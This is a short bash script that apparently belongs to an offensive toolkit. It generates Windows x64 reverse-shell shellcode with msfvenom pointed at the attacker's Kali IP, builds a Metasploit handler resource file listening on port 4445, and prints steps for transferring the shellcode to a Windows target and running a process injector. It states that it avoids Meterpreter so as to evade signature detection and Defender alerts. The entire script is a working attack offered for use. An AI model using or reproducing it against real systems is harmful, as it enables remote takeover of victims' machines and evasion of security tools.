#!/bin/bash
# Generate simple shellcode for process injection (avoids Meterpreter detection)

echo "=== Generating Shellcode for Process Injection ==="
echo ""

# Get Kali IP
IP=$(hostname -I | awk '{print $1}')
echo "[*] Using Kali IP: $IP"
echo ""

echo "[*] Generating x64 shell shellcode..."
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4445 -f python -v shellcode -o shellcode.py

if [ $? -eq 0 ]; then
    echo "[+] Generated shellcode.py"
    
    # Show size
    SIZE=$(grep -c '\\x' shellcode.py)
    echo "[+] Shellcode size: approximately $SIZE bytes"
else
    echo "[-] Failed to generate shellcode"
    exit 1
fi

# Create Metasploit handler for simple shell
cat > injection_handler.rc << EOF
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4445
set ExitOnSession false
exploit -j
EOF

echo "[+] Created injection_handler.rc"
echo ""

echo "=== Instructions ==="
echo "1. Start handler on Kali:"
echo "   msfconsole -r injection_handler.rc"
echo ""
echo "2. Transfer shellcode.py to Windows target"
echo ""
echo "3. Run fixed_injector.py on Windows"
echo ""
echo "[!] Using simple shell instead of Meterpreter to avoid signature detection"
echo "[!] This provides command execution without triggering Defender alerts"
